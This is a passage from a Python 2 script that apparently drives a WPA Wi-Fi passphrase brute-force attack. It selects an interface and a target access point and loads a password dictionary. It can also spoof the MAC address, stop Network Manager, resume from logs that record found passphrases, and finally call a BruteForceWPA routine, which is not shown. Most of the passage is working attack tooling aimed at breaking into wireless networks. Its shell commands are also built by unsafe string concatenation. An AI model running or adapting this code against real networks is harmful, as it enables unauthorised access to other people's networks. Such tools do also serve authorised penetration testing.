        COMPLETE_FOUND=""
        findstr="<<COMPLETED>>"
	ps=subprocess.Popen("cat " + scanlog + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
	Result=ps.stdout.read()
        if Result!="":
            COMPLETE_FOUND="1"

        findstr="<<COMPLETED-FOUND>>"
        ps=subprocess.Popen("cat " + scanlog + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
        Result=ps.stdout.read()
        if Result!="":
            COMPLETE_FOUND="2"

        if COMPLETE_FOUND=="1" or COMPLETE_FOUND=="2":
            findstr="ESSID::=="
	    ps=subprocess.Popen("cat " + scanlog + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
	    Result=ps.stdout.read()
            if Result!="":
                FESSID=Result.replace("ESSID::==","").replace("\n","")
                findstr="PASSPHRASE::=="
	        ps=subprocess.Popen("cat " + scanlog + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
                Result=ps.stdout.read()
                if Result!="":
                    FPASSPHRASE=Result.replace("PASSPHRASE::==","").replace("\n","")
                    findstr="LASTSCAN::=="
	            ps=subprocess.Popen("cat " + scanlog + " | grep '" + findstr + "'" , shell=True, stdout=subprocess.PIPE)	
	            Result=ps.stdout.read()
                    if Result!="":
                        FLASTSCAN=Result.replace("LASTSCAN::==","").replace("\n","").replace("\n","")
                        if COMPLETE_FOUND=="2":
                            printc ("i","A previous successful result log file found.","")
                        if COMPLETE_FOUND=="1":
                            printc ("i","A previous unsuccessful result log file found.","")

                        printc ("  ",fcolor.BBlue + "Last Scan\t\t   : " + fcolor.BRed + FLASTSCAN,"")
                        printc ("  ", fcolor.BBlue + "ESSID\t\t   : " + fcolor.BRed + FESSID,"")

                        if COMPLETE_FOUND=="2":
                            printc ("  ",fcolor.BBlue + "Correct Passphrase\t   : " + fcolor.BRed + FPASSPHRASE,"")

                        print ""
                        printc ("x","Press a key to delete the log file..","")
                        os.remove(scanlog)
	                printc (" ",fcolor.SRed + "Previous scan log deleted..", "")
                        print ""
	else:
	    printc ("i","A previous log file was found with the following setting:","")
            datafile = file(scanlog)
            TSELECTED_ESSID=""
            TSELECTED_ESSID=""
            TSELECTED_IFACE=""
            TSELECTED_DICT=""
            TTIMEOUT=""
            for line in datafile:
                if "ESSID::==" in line:
                    line = line.replace("ESSID::==","")
                    line = line[:-1]
                    printc ("  ", fcolor.BBlue + "ESSID\t   : " + fcolor.BRed + line,"")
                    TSELECTED_ESSID=line
                if "IFACE::==" in line:
                    line = line.replace("IFACE::==","")
                    line = line[:-1]
                    printc ("  ",fcolor.BBlue + "Interface\t   : " + fcolor.BRed + line,"")
                    TSELECTED_IFACE=line
                if "DICT::==" in line:
                    line = line.replace("DICT::==","")
                    line = line[:-1]
                    printc ("  ",fcolor.BBlue + "Dictionary\t   : " + fcolor.BRed + line,"")
                    TSELECTED_DICT=line
                if "TIMEOUT::==" in line:
                    line = line.replace("TIMEOUT::==","")
                    line = line[:-1]
                    printc ("  ",fcolor.BBlue + "Timeout\t   : " + fcolor.BRed + line,"")
                    TTIMEOUT=line
                if "PASSPHRASE::==" in line:
                    line = line.replace("PASSPHRASE::==","")
                    line = line[:-1]
                    printc ("  ",fcolor.BBlue + "Last Pass\t   : " + fcolor.BRed + line,"")
                    TLastPass=line
                if "LASTSCAN::==" in line:
                    line = line.replace("LASTSCAN::==","")
                    line = line[:-1]
                    printc ("  ",fcolor.BBlue + "Last Scan\t   : " + fcolor.BRed + line,"")

            print ""
            if TSELECTED_ESSID!="" and TSELECTED_ESSID!="" and TSELECTED_IFACE!="" and TSELECTED_DICT!="" and TTIMEOUT!="":
                Ask=AskQuestion(fcolor.SGreen + "" + fcolor.BGreen +"Continue with previous scan log ?","Y/n","U","Y","1")
                if Ask=="Y":
                    PrevLogFound=1
                    SELECTED_ESSID=TSELECTED_ESSID
                    SELECTED_IFACE=TSELECTED_IFACE
                    SELECTED_DICT=TSELECTED_DICT
                    TIMEOUT=TTIMEOUT
                    LastPass=TLastPass
                else:
                    LastPass=""
                    PrevLogFound=0
                print ""
            else:
                printc ("!!!","The previous scan log is corrupted","")
                printc ("x",fcolor.BRed + "Press any key to delete it...","")
                os.remove(scanlog)
                if IsFileDirExist(scanlog)=="E":
                    printc (" ", fcolor.SRed + "Log file deleted !","")
                    print ""
                else:
                    printc (" ", fcolor.SRed + "Failed to delete the scan log file !","")
                    printc (" ", fcolor.SGreen + "Resuming with new configuration ...","")
                    print ""
                    LastPass=""
                    PrevLogFound=0



    if PrevLogFound==0 or PrevLogFound==1:
        if SELECTED_IFACE=="":
            SELECTED_IFACE=SelectInterfaceToUse()
        else:
            Rund="iwconfig " + SELECTED_IFACE + " > /dev/null 2>&1"
            result=os.system(Rund)
            if result==0:
                printc(">",fcolor.BIGray + "Interface Selection Bypassed....","")
            else:
                printc ("!!!", fcolor.BRed + "The interface specified [ " + fcolor.BWhite + SELECTED_IFACE + fcolor.BRed + " ] is not available." ,"")
                print ""
                SELECTED_IFACE=SelectInterfaceToUse()

        printc (" ", fcolor.SWhite + "Selected Interface ==> " + fcolor.BRed + str(SELECTED_IFACE),"")
        print ""
        ps=subprocess.Popen("ifconfig " + str(SELECTED_IFACE) + " up  > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
        if SELECTED_ESSID=="":
            GetIWList("WPA-S",SELECTED_IFACE,"")
            print ""
            printc ("i", fcolor.BRed + "ESSID (Access Point Name) Selection","")
            SELECTED_ESSID=SelectESSIDFromList()
            SELECTED_ESSID=RemoveColor(AP_ESSIDList[ListingIndex])
        else:
            printc(">",fcolor.BIGray + "ESSID Scanning Bypassed....","")
        printc (" ",fcolor.SWhite + "Selected ESSID ==> " + fcolor.BRed + str(SELECTED_ESSID),"")
        print ""
        if SELECTED_DICT=="":
            DDict="/usr/share/john/password.lst"
            if IsFileDirExist(DDict)!="F":
                DDict=Run("locate password.lst | sed -n '1p'","0")
                if DDict=="":
                    DDict=Run("locate passwords.lst | sed -n '1p'","0")
            DDict=DDict.replace("\n","")
            printc ("i", fcolor.BRed + "Dictionary Selection","")
            SELECTED_DICT=AskQuestion("Enter the dictionary to use for the attack","Default : " + DDict,"FN",DDict,"0")
        else:
            printc(">",fcolor.BIGray + "Dictionary Selection Bypassed....","")
        statinfo = os.stat(SELECTED_DICT)
        filesize=ConvertByte(statinfo.st_size)
        printc (" ",fcolor.SWhite + "Selected Dictionary ==> " + fcolor.BRed + str(SELECTED_DICT) + fcolor.SWhite + " - [" + filesize + "]","")
        print ""
        if TIMEOUT=="":
            printc ("i", fcolor.BRed + "TimeOut Setting","")
            TIMEOUT=AskQuestion("Enter the delay timeout in seconds","Default : 15","N","15","0")
        else:
            printc(">",fcolor.BIGray + "Timeout Setting Bypassed....","")
        printc (" ",fcolor.SWhite + "Timeout Set ==> " + fcolor.BRed + str(TIMEOUT),"")
        print ""

    if SPOOF_MAC=="1":
        Result=SpoofMAC(SELECTED_IFACE,ASSIGNED_MAC)
        ps=subprocess.Popen("ifconfig " + str(SELECTED_IFACE) + " up" , shell=True, stdout=subprocess.PIPE)												

    print ""
    printl (fcolor.SGreen + "     Calculating .... Please wait....","0","")
    Result=GetFileLine(SELECTED_DICT,"2")
    totalseconds=long(int(TIMEOUT) * int(UsableLine))
    esttimeuse=str(datetime.timedelta(seconds=totalseconds))
    a = datetime.datetime.now()
    added_datetime = AddTime(a, totalseconds)
    printl (fcolor.BGreen + "","0","")
    statinfo = os.stat(SELECTED_DICT)
    filesize=ConvertByte(statinfo.st_size)

    ps=subprocess.Popen("ifconfig " + str(SELECTED_IFACE) + " | grep 'HWaddr' | tr -s ' ' | cut -d ' ' -f5" , shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))	
    MACADDR=ps.stdout.read().replace("\n","").upper().replace("-",":")
    MACADDR=MACADDR[:17]

    printc("i",fcolor.BUCyan + "Setting Confirmation","")
    printc(" ",fcolor.BWhite + "Interface to use\t: " + fcolor.BGreen + SELECTED_IFACE,"")
    printc(" ",fcolor.BWhite + "Interface MAC Addr\t: " + fcolor.BGreen + MACADDR,"")
    printc(" ",fcolor.BWhite + "Target Access Point: " + fcolor.BGreen + SELECTED_ESSID,"")
    printc(" ",fcolor.BWhite + "Dictionary to use\t: " + fcolor.BGreen + SELECTED_DICT,"")
    printc(" ",fcolor.BWhite + "\t\t\t: " + fcolor.SWhite + "Filesize     - " + str(filesize),"")
    printc(" ",fcolor.BWhite + "\t\t\t: " + fcolor.SWhite + "Total lines  - " + str(TotalLine) + " lines","")
    printc(" ",fcolor.BWhite + "\t\t\t: " + fcolor.SWhite + "Usable lines - " + str(UsableLine) + " lines","")
    printc(" ",fcolor.BWhite + "Timeout Setting\t: " + fcolor.BGreen + TIMEOUT,"")
    printc(" ",fcolor.BYellow + "Est. Time Use\t: " + fcolor.BPink + str(esttimeuse),"")
    printc(" ",fcolor.BYellow + "Est. Completion\t: " + fcolor.BPink + str(added_datetime),"")

    result=os.system("service network-manager status > /dev/null 2>&1")
    if result==0:
        print ""
        Ask=AskQuestion(fcolor.SGreen + "The Network Manager need to be disable in order to run the test. " + fcolor.BGreen +" Disable ?","Y/n","U","Y","1")
        if Ask=="Y":
            printl (fcolor.SGreen + "     Disabling Network Manager....","1","")
            result=os.system("service network-manager stop > /dev/null 2>&1")
            if result==0:
                printl (fcolor.BGreen + "[Done]","1","")
                print ""
                printc ("  ",fcolor.SWhite + "To re-enable it, type '" + fcolor.SGreen + "service network-manager start" + fcolor.SWhite + "'","")
	    else:
                printl (fcolor.BRed + "[Fail]","1","")
                print ""
                printc ("!!!","Auto disabling the Network Manager failed !!","")
                printc ("  ",fcolor.BRed + "You need to disable it manually before proceed...","")
                printc ("  ",fcolor.SWhite + "Type '" + fcolor.SGreen + "service network-manager stop" + fcolor.SWhite + "'","")
                exit(1)
        else:
            print ""
            printc ("!!!","Network Manager need to be disable before proceed !!","")
            printc ("  ",fcolor.SWhite + "Disable it manually by typing '" + fcolor.SGreen + "service network-manager stop" + fcolor.SWhite + "'","")
            exit(1)
        print ""
    print ""
    printc ("x","Press any key to begin with the test ...","")
    print ""
    printc ("i",fcolor.BRed + "Begin testing...","")


    if PrevLogFound==0:
        BruteForceWPA("")
        exit(0)
    else:
       BruteForceWPA(LastPass)
       exit(0)



except (KeyboardInterrupt, SystemExit):
    printd("KeyboardInterrupt - " + str(KeyboardInterrupt) + "\n        SystemExit - " + str(SystemExit))
    print ""
    printc ("*", fcolor.BRed + "Application shutdown !!","")
    if TimeStart!="":
        result=DisplayTimeStamp("summary-a","")
    print ""
